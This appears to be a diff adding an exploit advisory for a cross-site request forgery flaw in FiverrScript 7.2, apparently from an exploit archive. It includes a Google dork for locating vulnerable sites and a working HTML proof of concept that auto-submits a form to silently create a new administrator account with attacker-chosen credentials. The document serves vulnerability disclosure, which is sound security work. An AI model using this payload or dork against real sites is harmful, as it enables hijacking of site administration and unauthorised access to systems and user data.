@@ -1,0 +1,39 @@
+# Exploit Title: FiverrScript CSRF Vulnerability (add New admin)
+# Author: Mahmoud Gamal (@Zombiehelp54)
+# Google Dork: intext:Powered by FiverrScript
+# Date: 10/06/2015
+# Exploit Author: Scriptolution
+# Vendor Homepage: http://scriptolution.com
+# Software Link: http://fiverrscript.com
+# Version: 7.2
+# Tested on: Windows 
+
+FiverrScript is vulnerable to CSRF attack (No CSRF token in place) meaning
+that if an admin user can be tricked to visit a crafted URL created by
+attacker (via spear phishing/social engineering), a form will be submitted
+to (http://localhost/fiverrscript/administrator/admins_create.php) that
+will add a new user as administrator.
+Once exploited, the attacker can login to the admin panel (
+http://localhost/fiverrscript/administrator/index.php)
+using the username and the password he posted in the form.
+
+CSRF PoC Code
+=============
+
+<form action="http://localhost/fiverrscript/administrator/admins_create.php"
+method="post" id="main_form" name="main_form"
+enctype="multipart/form-data"><input type="hidden" id="submitform"
+name="submitform" value="1">
+<input type="hidden" name="username" value="attackerUsername">
+<input type="hidden" name="password" value="attackerPreferedPW" >
+<input type="hidden" name="email" value="attackeremail@something.com">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+
+Reported to script owner.
+
+Security Level:
+================
+High
